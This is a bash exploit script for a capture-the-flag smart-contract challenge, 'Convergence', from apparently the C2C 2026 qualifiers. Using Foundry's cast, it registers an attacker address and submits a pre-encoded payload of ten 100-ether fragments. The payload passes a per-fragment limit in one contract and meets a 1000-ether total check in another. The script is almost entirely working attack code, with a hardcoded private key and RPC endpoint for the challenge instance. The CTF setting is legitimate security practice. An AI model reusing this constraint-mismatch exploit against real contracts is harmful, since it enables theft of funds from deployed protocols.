#!/bin/bash
# Convergence CTF Challenge - Complete Exploit Script
# C2C 2026 Qualifiers
set -e
echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
echo "â•‘ Convergence CTF Challenge Exploit â•‘"
echo "â•‘ Constraint Mismatch Vulnerability â•‘"
echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo
# Configuration
RPC_URL="http://challenges.1pc.tf:44403/d13b3043-fd29-4a69-8ca3-58ad2ad49987"
PRIVATE_KEY="fc0042b8f856b0b98fcdb62a69f039a9f211111335342d5acb75fcf4bb12e69f"
SETUP_ADDRESS="0x1dBa58Fa122Ac7755D8D28Bb6ABD7A2632cDF424"
ATTACKER="0x96967b9631cc7A860Eebe3c9Df17aBB01763C662"
# Pre-generated truth payload (10 fragments Ã— 100 ether = 1000 ether)
TRUTH_DATA="0x00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c66200000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c662000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000000000000000000000000000000000000000024000000000000000000000000000000000000000000000000000000000000002c0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003c0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000004c0000000000000000000000000000000000000000000000000000000000000054000000000000000000000000000000000000000000000000000000000000005c000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096967b9631cc7a860eebe3c9df17abb01763c6620000000000000000000000000000000000000000000000056bc75e2d6310000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000"
echo "ğŸ” Configuration:"
echo " Attacker: $ATTACKER"
echo " Setup: $SETUP_ADDRESS"
echo
# Check if cast is available
if ! command -v cast &> /dev/null; then
    echo "âŒ 'cast' command not found. Please install Foundry:"
    echo " curl -L https://foundry.paradigm.xyz | bash"
    echo " foundryup"
    exit 1
fi
# Step 0: Get Challenge contract address
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 0: Discovering Challenge Contract"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
CHALLENGE_ADDRESS=$(cast call $SETUP_ADDRESS "challenge()(address)" --rpc-url $RPC_URL 2>/dev/null)
if [ -z "$CHALLENGE_ADDRESS" ] || [ "$CHALLENGE_ADDRESS" = "0x0000000000000000000000000000000000000000" ]; then
    echo "âŒ Failed to fetch Challenge contract address"
    exit 1
fi
echo "âœ… Challenge contract: $CHALLENGE_ADDRESS"
echo
# Step 1: Register as seeker
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 1: Register as Seeker"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
IS_SEEKER=$(cast call $CHALLENGE_ADDRESS "seekers(address)(bool)" $ATTACKER --rpc-url $RPC_URL 2>/dev/null || echo "false")
if [ "$IS_SEEKER" = "false" ]; then
    echo "ğŸ“ Registering as seeker..."
    TX_HASH=$(cast send $CHALLENGE_ADDRESS "registerSeeker()" \
        --private-key $PRIVATE_KEY \
        --rpc-url $RPC_URL \
        --json 2>/dev/null | jq -r '.transactionHash' || echo "")
   
    if [ -z "$TX_HASH" ]; then
        echo "âŒ Failed to register as seeker"
        exit 1
    fi
   
    echo "âœ… Registered as seeker (TX: $TX_HASH)"
else
    echo "âœ… Already registered as seeker"
fi
echo
# Step 2: Show exploit strategy
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 2: Exploit Strategy"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸ¯ Vulnerability: Constraint Mismatch"
echo " - Setup.bindPact(): Limits each fragment to â‰¤ 100 ether"
echo " - Challenge.transcend(): Requires total â‰¥ 1000 ether"
echo " - Neither validates BOTH constraints!"
echo
echo "ğŸ’¡ Solution: 10 fragments Ã— 100 ether = 1000 ether"
echo " âœ“ Each fragment â‰¤ 100 ether (passes Setup validation)"
echo " âœ“ Total = 1000 ether (passes Challenge requirement)"
echo
# Step 3: Chronicle the truth
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 3: Chronicle Truth via bindPact()"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸ“œ Submitting truth to Setup contract..."
TX_HASH=$(cast send $SETUP_ADDRESS "bindPact(bytes)" "$TRUTH_DATA" \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL \
    --json 2>/dev/null | jq -r '.transactionHash' || echo "")
if [ -z "$TX_HASH" ]; then
    echo "âš ï¸ bindPact() might have failed or already exists"
else
    echo "âœ… Truth chronicled (TX: $TX_HASH)"
fi
echo
# Step 4: Transcend!
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 4: Transcend! ğŸš€"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸŒŸ Calling transcend() with truth payload..."
TX_HASH=$(cast send $CHALLENGE_ADDRESS "transcend(bytes)" "$TRUTH_DATA" \
    --private-key $PRIVATE_KEY \
    --rpc-url $RPC_URL \
    --json 2>/dev/null | jq -r '.transactionHash' || echo "")
if [ -z "$TX_HASH" ]; then
    echo "âŒ Failed to transcend"
    exit 1
fi
echo "âœ… Transcended! (TX: $TX_HASH)"
echo
# Step 5: Verify solution
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "Step 5: Verify Solution"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
ASCENDED=$(cast call $CHALLENGE_ADDRESS "ascended()(address)" --rpc-url $RPC_URL 2>/dev/null)
IS_SOLVED=$(cast call $SETUP_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL 2>/dev/null)
echo "ğŸ“Š Results:"
echo " Ascended: $ASCENDED"
echo " Solved: $IS_SOLVED"
echo
if [ "$IS_SOLVED" = "true" ]; then
    echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "â•‘ ğŸ† SUCCESS! ğŸ† â•‘"
    echo "â•‘ â•‘"
    echo "â•‘ Challenge Completed Successfully! â•‘"
    echo "â•‘ â•‘"
    echo "â•‘ ğŸš© Capture the flag from the challenge server â•‘"
    echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
else
    echo "âŒ Challenge not solved yet"
    echo " Expected ascended: $ATTACKER"
    echo " Got ascended: $ASCENDED"
fi
